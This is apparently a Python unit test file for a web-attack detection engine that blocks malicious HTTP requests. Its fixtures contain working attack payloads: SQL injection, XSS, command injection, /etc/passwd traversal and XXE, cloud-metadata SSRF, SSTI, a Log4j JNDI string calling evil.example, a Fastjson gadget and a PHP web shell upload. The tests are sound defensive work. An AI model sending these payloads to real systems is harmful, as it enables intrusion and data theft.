import tempfile
import unittest
from pathlib import Path
from unittest.mock import Mock, patch

from scripts.fast_defense import FastDecision, FastDefenseGuard, FastRuleEngine


ROOT = Path(__file__).resolve().parents[1]
RULES = ROOT / "rules" / "fast_defense_rules.json"


def request(uri: str, body: str = "", source_ip: str = "8.8.8.8") -> dict:
    return {
        "frame_no": 42,
        "time": 1_700_000_000.125,
        "src_ip": source_ip,
        "dst_ip": "203.0.113.10",
        "method": "POST",
        "uri": uri,
        "host": "protected.example",
        "content_type": "application/x-www-form-urlencoded",
        "request_body": body,
    }


class FastRuleEngineTests(unittest.TestCase):
    @classmethod
    def setUpClass(cls) -> None:
        cls.engine = FastRuleEngine(RULES)

    def test_high_confidence_attack_families_match(self) -> None:
        samples = {
            "SQL_INJECTION": request("/login", "username=admin&password=%27+or+1%3D1--+"),
            "XSS": request("/comment", "text=%3Cscript%3Ealert(1)%3C/script%3E"),
            "COMMAND_INJECTION": request("/ping", "host=127.0.0.1%3Bwhoami"),
            "PATH_TRAVERSAL": request("/download?file=../../../../etc/passwd"),
            "XXE": request(
                "/xml",
                '<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
            ),
            "SSRF": request("/fetch?url=http://169.254.169.254/latest/meta-data/"),
            "SSTI": request("/render", "name={{config.__class__.__mro__}}"),
            "LOG4J_NDAY": request("/login", "${jndi:ldap://evil.example/a}"),
            "FASTJSON_NDAY": request(
                "/json",
                '{"@type":"com.sun.rowset.JdbcRowSetImpl","dataSourceName":"ldap://evil"}',
            ),
            "WEB_SHELL": request(
                "/upload",
                'Content-Disposition: form-data; name="f"; filename="a.php"\r\n\r\n'
                '<?php system($_GET["cmd"]); ?>',
            ),
        }
        for expected_category, sample in samples.items():
            with self.subTest(expected_category=expected_category):
                decision = self.engine.decide(sample)
                self.assertIsNotNone(decision)
                self.assertEqual(expected_category, decision.category)

    def test_normal_business_and_document_text_do_not_match(self) -> None:
        samples = [
            request("/login", "username=alice&password=CorrectHorseBatteryStaple"),
            request("/search?q=union+station+schedule"),
            request("/docs", "A script writing workshop selected actors from a labor union."),
            request("/editor", "SELECT id FROM products WHERE id = 1"),
            request("/bookmark", "url=https://example.com/news"),
            request("/api", '{"@type":"invoice","items":[1,2]}'),
            request("/public/assets/app.js"),
        ]
        for sample in samples:
            with self.subTest(uri=sample["uri"]):
                self.assertEqual([], self.engine.match(sample))
                self.assertIsNone(self.engine.decide(sample))

    def test_private_loopback_and_reserved_sources_are_never_auto_blocked(self) -> None:
        for source_ip in ("127.0.0.1", "10.0.0.8", "192.168.1.8", "169.254.1.1", "203.0.113.7"):
            with self.subTest(source_ip=source_ip):
                self.assertIsNone(
                    self.engine.decide(request("/login", "password=' or 1=1--", source_ip=source_ip))
                )


class _Cursor:
    def __init__(self) -> None:
        self.statements = []
        self._fetch = None

    def __enter__(self):
        return self

    def __exit__(self, *_args):
        return False

    def execute(self, sql, params=None):
        self.statements.append((" ".join(str(sql).split()), params))
        self._fetch = None

    def fetchone(self):
        return self._fetch


class _Connection:
    def __init__(self) -> None:
        self.cursor_value = _Cursor()
        self.committed = False
        self.rolled_back = False

    def cursor(self):
        return self.cursor_value

    def commit(self):
        self.committed = True

    def rollback(self):
        self.rolled_back = True

    def close(self):
        pass


class FastDefenseGuardTests(unittest.TestCase):
    def test_disabled_policy_skips_rule_evaluation(self) -> None:
        guard = FastDefenseGuard.__new__(FastDefenseGuard)
        guard._closed = False
        guard.enabled = Mock(return_value=False)
        guard.engine = Mock()
        self.assertIsNone(guard.inspect(request("/login", "password=' or 1=1--")))
        guard.engine.decide.assert_not_called()

    def test_enforcement_only_writes_internal_audit_and_block_state(self) -> None:
        conn = _Connection()
        guard = FastDefenseGuard.__new__(FastDefenseGuard)
        guard._connect = Mock(return_value=conn)
        guard._log = Mock()
        decision = FastDecision(
            source_ip="8.8.8.8",
            destination_ip="1.1.1.1",
            method="POST",
            uri="/login",
            request_time=None,
            category="SQL_INJECTION",
            score=12,
            rule_ids=("FAST-SQLI-BOOLEAN-002",),
            fingerprint="a" * 64,
        )
        with patch("scripts.fast_defense.firewall_block_ip", return_value=(True, "")), patch(
            "scripts.fast_defense.firewall_status", return_value={"active": False}
        ):
            guard._enforce(decision)

        sql_text = "\n".join(sql for sql, _ in conn.cursor_value.statements).lower()
        self.assertTrue(conn.committed)
        self.assertIn("demo_fast_defense_audit", sql_text)
        self.assertIn("demo_blocked_ips", sql_text)
        self.assertNotIn("demo_attack_events", sql_text)
        self.assertNotIn("demo_attack_situations", sql_text)

    def test_capture_request_is_not_mutated_by_decision(self) -> None:
        sample = request("/login", "password=' or 1=1--")
        original = dict(sample)
        FastRuleEngine(RULES).decide(sample)
        self.assertEqual(original, sample)


if __name__ == "__main__":
    unittest.main()
